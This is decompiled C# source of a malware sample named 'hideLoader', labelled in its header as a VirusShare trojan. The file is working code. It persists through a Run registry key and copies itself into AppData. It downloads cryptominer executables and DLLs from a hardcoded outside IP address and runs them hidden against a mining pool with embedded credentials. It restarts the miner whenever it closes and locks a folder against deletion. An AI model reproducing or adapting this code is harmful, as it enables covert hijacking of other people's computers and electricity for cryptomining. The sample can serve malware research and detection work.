// Decompiled with JetBrains decompiler
// Type: Form3
// Assembly: hideLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DFB517FF-FEEC-4C95-9039-8D25F916A93A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-65336e848640662e9c731a193bc19656f164c053ab22279ba78aafb5dee82bca.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
public sealed class Form3
{
  private static WebClient WebClient1 = new WebClient();
  private static Process MiningProcess = new Process();

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  [STAThread]
  public static void Main()
  {
    string name = "goblmah371z";
    Mutex mutex;
    try
    {
      mutex = Mutex.OpenExisting(name);
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      mutex = new Mutex(true, name);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Interaction.Environ("appdata") + "\\"))
        Form3.LockAndHideFolder(Interaction.Environ("appdata") + "\\");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("update", (object) (Interaction.Environ("appdata") + "\\\\hideLoader.exe"));
      if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\hideLoader.exe"))
      {
        string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
        string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
        int moduleFileName = Form3.GetModuleFileName(0, ref fileName2, 256);
        Form3.MoveFile(Strings.LSet(fileName1, moduleFileName), Interaction.Environ("appdata") + "\\\\hideLoader.exe", 8L);
      }
      string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      if (System.IO.File.Exists(path))
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\CGMiner.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/CGMiner.exe", Interaction.Environ("appdata") + "\\\\CGMiner.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\diablo130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/diablo130302.cl", Interaction.Environ("appdata") + "\\\\diablo130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\diakgcn121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/diakgcn121016.cl", Interaction.Environ("appdata") + "\\\\diakgcn121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libeay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libeay32.dll", Interaction.Environ("appdata") + "\\\\libeay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libidn-11.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libidn-11.dll", Interaction.Environ("appdata") + "\\\\libidn-11.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk121016.cl", Interaction.Environ("appdata") + "\\\\phatk121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\poclbm130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/poclbm130302.cl", Interaction.Environ("appdata") + "\\\\poclbm130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\scrypt130511.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/scrypt130511.cl", Interaction.Environ("appdata") + "\\\\scrypt130511.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\ssleay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/ssleay32.dll", Interaction.Environ("appdata") + "\\\\ssleay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\zlib1.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/zlib1.dll", Interaction.Environ("appdata") + "\\\\zlib1.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libcurl-4.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libcurl-4.dll", Interaction.Environ("appdata") + "\\\\libcurl-4.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\librtmp.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/librtmp.dll", Interaction.Environ("appdata") + "\\\\librtmp.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libssh2.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libssh2.dll", Interaction.Environ("appdata") + "\\\\libssh2.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\\\CGMiner.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "--scrypt -o us3.wemineltc.com:3333 -u Sandbox.3 -p hwa274f --auto-fan --auto-gpu --gpu-threads 4 --gpu-fan 100 --temp-target 60 --temp-overheat 70 --no-submit-stale -I d";
      }
      else
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\UFASoft.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/coin-miner.exe", Interaction.Environ("appdata") + "\\\\UFASoft.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\bdb.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/bdb.dll", Interaction.Environ("appdata") + "\\\\bdb.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\btc.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/btc.il", Interaction.Environ("appdata") + "\\\\btc.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\btc-evergreen.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/btc-evergreen.il", Interaction.Environ("appdata") + "\\\\btc-evergreen.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\coinutil.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/coinutil.dll", Interaction.Environ("appdata") + "\\\\coinutil.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\miner.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/miner.dll", Interaction.Environ("appdata") + "\\\\miner.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk.cl", Interaction.Environ("appdata") + "\\\\phatk.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk.ptx"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk.ptx", Interaction.Environ("appdata") + "\\\\phatk.ptx");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\usft_ext.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov_9291/usft_ext.dll", Interaction.Environ("appdata") + "\\\\usft_ext.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\\\UFASoft.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-a scrypt -g no -o us3.wemineltc.com:3333 -u Sandbox.3 -p hwa274f -t 1";
      }
      Form3.MiningProcess.Start();
      Form3.MiningProcess.EnableRaisingEvents = true;
      Form3.MiningProcess.Exited += new EventHandler(Form3.MiningProcessClosed);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex);
      ProjectData.ClearProjectError();
    }
    while (true)
      Thread.Sleep(3009);
  }

  public static void MiningProcessClosed(object sender, EventArgs e) => Form3.MiningProcess.Start();

  public static bool LockAndHideFolder(string path)
  {
    string name = WindowsIdentity.GetCurrent().Name;
    FileSystemAccessRule rule1 = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
    FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    DirectorySecurity directorySecurity = new DirectorySecurity();
    directorySecurity.AddAccessRule(rule1);
    directorySecurity.AddAccessRule(rule3);
    directorySecurity.AddAccessRule(rule2);
    bool flag;
    try
    {
      Process process = new Process();
      Directory.CreateDirectory(path, directorySecurity);
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "CMD.exe",
        Arguments = "/C attrib -s -h " + Convert.ToString(path)
      };
      process.Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }
}
